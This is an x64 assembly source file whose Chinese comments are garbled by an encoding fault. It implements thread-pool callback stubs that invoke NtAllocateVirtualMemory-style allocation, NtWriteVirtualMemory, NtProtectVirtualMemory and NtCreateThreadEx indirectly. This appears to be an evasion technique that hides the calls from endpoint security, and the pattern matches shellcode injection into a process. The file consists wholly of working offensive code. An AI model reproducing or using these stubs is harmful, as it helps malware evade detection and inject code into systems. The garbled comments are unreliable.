.code

WorkCallback proc
    mov rbx, rdx                ; rdx ���ǽṹ���ַ�� ����ϵͳapi���в�����api��ַ�Ľṹ�� 
    mov rax, [rbx]              ; �ṹ���1����Ա�� api��ַ
    mov rcx, [rbx + 8h]        ; �ṹ���2����Ա�� api�ĵ�1������ RCX
    mov rdx, [rbx + 10h]       ; �ṹ���3����Ա�� api�ĵ�2������ RDX
    xor r8, r8                  ; api��3�������� R8
    mov r9, [rbx + 18h]        ; �ṹ���4����Ա��api��4�������� R9
    mov r10, [rbx + 20h]       ; �ṹ���5���� api��6�������� ջ��������R10 ��һ��
    mov [rsp+30h], r10         ; ��R10 �����api��6�������ŵ�ջ��
    mov r10, 3000h             ; api��5������
    mov [rsp+28h], r10         ; �ŵ�ջ��
    jmp rax						;�����͹�������һ��������ջ������ֻ��Ҫ����api��ַȥִ�к����Ϳ�����

WorkCallback endp


WorkCallCreateThread proc
    mov rax, [rsp]
    push rax                    ;;����ԭ����ջ��
    sub rsp, 58h   ;̧ջ
    mov rbx, rdx                ; �ṹ���׵�ַ
    mov rax, [rbx]              ; NtCreateThreadEx��ַ
    mov rcx, [rbx + 8h]        ; PHANDLE ThreadHandle
    mov rdx, [rbx + 10h]       ; 0x1FFFFF
    xor r8, r8                  ; NULL
    mov r9, [rbx + 18h]        ; ProcessHandle
    mov r10, [rbx + 20h]       
    mov [rsp+20h], r10          ; startAddress
    mov [rsp+28h], r8           ;����6
    mov [rsp+30h], r8           ;����7
    mov [rsp+38h], r8           ;����8
    mov [rsp+40h], r8           ;����9
    mov [rsp+48h], r8           ;����10
    mov [rsp+50h], r8           ;����11
    call rax
    add rsp, 58h
    pop rax
    mov [rsp], rax
    ret 

WorkCallCreateThread endp



WorkCallNtWriteVirtualMemory proc
    mov rbx, rdx                ; rdx ���ǽṹ���ַ�� ����ϵͳapi���в�����api��ַ�Ľṹ�� 
    mov rax, [rbx]              ; �ṹ���1����Ա�� api��ַ
    mov rcx, [rbx + 8h]        ; �ṹ���2����Ա�� api�ĵ�1������ RCX
    mov rdx, [rbx + 10h]       ; �ṹ���3����Ա�� api�ĵ�2������ RDX
    mov r8, [rbx + 18h]         ; �ṹ���4����Ա�� R8
    mov r9, [rbx + 20h]        ; �ṹ���5����Ա��api��4�������� R9
    mov r10, [rbx + 28h]        ; �ṹ���6����Ա,api��5������
    mov [rsp+28h], r10         ; �ŵ�ջ��
    jmp rax						;�����͹�������һ��������ջ������ֻ��Ҫ����api��ַȥִ�к����Ϳ�����

WorkCallNtWriteVirtualMemory endp


WorkCallNtProtectVirtualMemory proc
    xor rbx, rbx
    mov rbx, rdx                ; rdx ���ǽṹ���ַ�� ����ϵͳapi���в�����api��ַ�Ľṹ�� 
    mov rax, [rbx]              ; �ṹ���1����Ա�� api��ַ
    mov rcx, [rbx + 8h]        ; �ṹ���2����Ա�� api�ĵ�1������ RCX
    mov rdx, [rbx + 10h]       ; �ṹ���3����Ա�� api�ĵ�2������ RDX
    mov r8, [rbx + 18h]         ; �ṹ���4����Ա�� R8
    mov r9, [rbx + 20h]        ; �ṹ���5����Ա��api��4�������� R9
    mov r10, [rbx + 28h]        ; �ṹ���6����Ա,api��5������
    mov [rsp+28h], r10         ; �ŵ�ջ��
    jmp rax						;�����͹�������һ��������ջ������ֻ��Ҫ����api��ַȥִ�к����Ϳ�����
WorkCallNtProtectVirtualMemory endp

end